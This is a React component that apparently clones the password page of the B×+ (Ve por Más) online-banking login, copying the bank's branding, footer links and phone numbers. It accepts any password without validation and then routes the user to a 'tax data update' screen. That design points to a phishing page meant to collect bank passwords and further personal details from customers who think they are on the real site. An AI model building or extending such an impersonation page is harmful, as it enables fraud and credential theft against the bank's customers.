import React, { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'

const Password: React.FC = () => {
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [progress, setProgress] = useState(0)
  const navigate = useNavigate()

  useEffect(() => {
    // Verificar que haya un usuario en sesión
    const userName = sessionStorage.getItem('userName')
    if (!userName) {
      navigate('/login')
    }

    // Iniciar animación de carga - efecto de onda que pasa de izquierda a derecha
    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 150) {
          return -50 // Reiniciar desde la izquierda (empieza antes de ser visible)
        }
        return prev + 1.5 // Incremento más lento para efecto suave
      })
    }, 40) // Actualizar cada 40ms para una animación más suave

    return () => clearInterval(interval)
  }, [navigate])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')
    setLoading(true)

    if (!password) {
      setError('Por favor ingrese su contraseña')
      setLoading(false)
      return
    }

    // Aquí iría la lógica de validación de contraseña
    // Redirigir a la pantalla de actualización de datos fiscales
    navigate('/tax-data-update')
  }

  const handleGoBack = () => {
    navigate('/login')
  }

  const togglePassword = () => {
    setShowPassword(!showPassword)
  }

  const footerListLnk = [
    { href: 'https://www.vepormas.com/recursos/resources/img/03MAY_GUIA_INVERSION.PDF', text: 'Guía de servicios de inversión' },
    { href: 'https://www.vepormas.com/fwpf/portal/documents/tips-de-seguridad', text: 'Tips de seguridad' },
    { href: 'https://www.vepormas.com/recursos/res/html/terminos_condiciones.pdf', text: 'Términos y condiciones' },
    { href: 'https://www.vepormas.com/fwpf/portal/documents/aviso-legal', text: 'Aviso legal' }
  ]

  return (
    <div className="wrapper dark">
      <div className="container">
        {/* Logo */}
        <div className="row row-logo-login">
          <div className="col-xs-12 logo" style={{ textAlign: 'center', marginBottom: '30px', marginTop: '20px' }}>
            <img src="assets/images/logoBlancoR.png" alt="B×+" style={{ maxWidth: '180px', height: 'auto' }} />
          </div>
        </div>

        <div className="row content">
          <div className="col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">
            {/* Título */}
            <div style={{ textAlign: 'center', marginBottom: '40px' }}>
              <h1 className="title-banco" style={{ 
                color: '#4A90E2', 
                fontSize: '22px', 
                fontWeight: 'normal',
                margin: 0
              }}>
                Banca en Línea B×+
              </h1>
            </div>

            <form onSubmit={handleSubmit} style={{ maxWidth: '100%', margin: '0 auto' }}>
              {/* Barra de carga de iniciales */}
              <div style={{ marginBottom: '25px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <label style={{ 
                  color: '#666', 
                  fontSize: '14px', 
                  display: 'block', 
                  marginBottom: '12px',
                  textAlign: 'center',
                  fontWeight: 'normal'
                }}>
                  Verifica tus iniciales
                </label>
                <div style={{
                  width: '60%',
                  height: '40px',
                  backgroundColor: '#f5f5f5',
                  borderRadius: '4px',
                  overflow: 'hidden',
                  position: 'relative',
                  border: '1px solid #ddd'
                }}>
                  <div
                    style={{
                      position: 'absolute',
                      left: `${progress - 20}%`,
                      width: '40%',
                      height: '100%',
                      background: 'linear-gradient(90deg, transparent 0%, #9e9e9e 20%, #9e9e9e 80%, transparent 100%)',
                      transition: 'left 0.04s linear',
                      borderRadius: '4px',
                      opacity: 0.7
                    }}
                  />
                </div>
              </div>

              {/* Campo de contraseña */}
              <div className="input-group" style={{ marginBottom: '30px' }}>
                <span className="input-group-addon" id="aria-password" style={{ 
                  backgroundColor: '#f5f5f5', 
                  color: '#666',
                  border: '1px solid #ddd',
                  borderRight: 'none',
                  borderRadius: '4px 0 0 4px',
                  padding: '12px 15px',
                  minWidth: '120px'
                }}>
                  Contraseña
                </span>
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="inputPassword"
                  name="password"
                  className="form-control"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Ingresa tu contraseña"
                  style={{
                    borderLeft: 'none',
                    borderRadius: '0',
                    padding: '12px',
                    fontSize: '16px'
                  }}
                  disabled={loading}
                />
                <span 
                  className="input-group-addon cursor-pointer" 
                  onClick={togglePassword}
                  style={{
                    backgroundColor: '#fff',
                    border: '1px solid #ddd',
                    borderLeft: 'none',
                    borderRadius: '0 4px 4px 0',
                    cursor: 'pointer',
                    padding: '12px 15px'
                  }}
                >
                  <span className={`fa font-18 ${showPassword ? 'fa-eye' : 'fa-eye-slash'}`} style={{ fontSize: '18px' }}></span>
                </span>
              </div>

              {error && (
                <div className="alert alert-danger" style={{ 
                  marginBottom: '20px', 
                  textAlign: 'center',
                  padding: '10px',
                  borderRadius: '4px'
                }}>
                  {error}
                </div>
              )}

              {/* Botón Continuar */}
              <div className="form-group" style={{ marginBottom: '15px' }}>
                <button
                  type="submit"
                  className="btn btn-block"
                  disabled={loading}
                  style={{
                    backgroundColor: '#B8E986',
                    color: '#fff',
                    border: 'none',
                    padding: '14px',
                    fontSize: '16px',
                    fontWeight: 'bold',
                    borderRadius: '4px',
                    cursor: loading ? 'not-allowed' : 'pointer',
                    width: '100%',
                    transition: 'background-color 0.3s'
                  }}
                  onMouseEnter={(e) => {
                    if (!loading) {
                      e.currentTarget.style.backgroundColor = '#A8D976'
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (!loading) {
                      e.currentTarget.style.backgroundColor = '#B8E986'
                    }
                  }}
                >
                  {loading ? 'Validando...' : 'Continuar'}
                </button>
              </div>

              {/* Botón Regresar */}
              <div className="form-group">
                <button
                  type="button"
                  onClick={handleGoBack}
                  className="btn btn-block"
                  disabled={loading}
                  style={{
                    backgroundColor: '#fff',
                    color: '#666',
                    border: '1px solid #ddd',
                    padding: '14px',
                    fontSize: '16px',
                    borderRadius: '4px',
                    cursor: 'pointer',
                    width: '100%',
                    transition: 'background-color 0.3s'
                  }}
                  onMouseEnter={(e) => {
                    if (!loading) {
                      e.currentTarget.style.backgroundColor = '#f9f9f9'
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (!loading) {
                      e.currentTarget.style.backgroundColor = '#fff'
                    }
                  }}
                >
                  Regresar
                </button>
              </div>
            </form>
          </div>
        </div>

        {/* Footer */}
        <div className="row" style={{ marginTop: '50px' }}>
          <div className="col-md-offset-1 col-sm-offset-1 col-lg-offset-1">
            <footer className="bck-darkgray">
              <div className="small text-center">
                <ul className="links foot">
                  {footerListLnk.map((link, index) => (
                    <li key={index}>
                      <a href={link.href} target="_blank" rel="noopener noreferrer">
                        {link.text}
                      </a>
                    </li>
                  ))}
                </ul>
                <span className="linea-bxm">
                  Línea B×+ Cd. de México y área metropolitana 55 1102 1919, del interior sin costo 800 837 6762.
                </span>
                <div className="clearfix"></div>
              </div>
            </footer>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Password
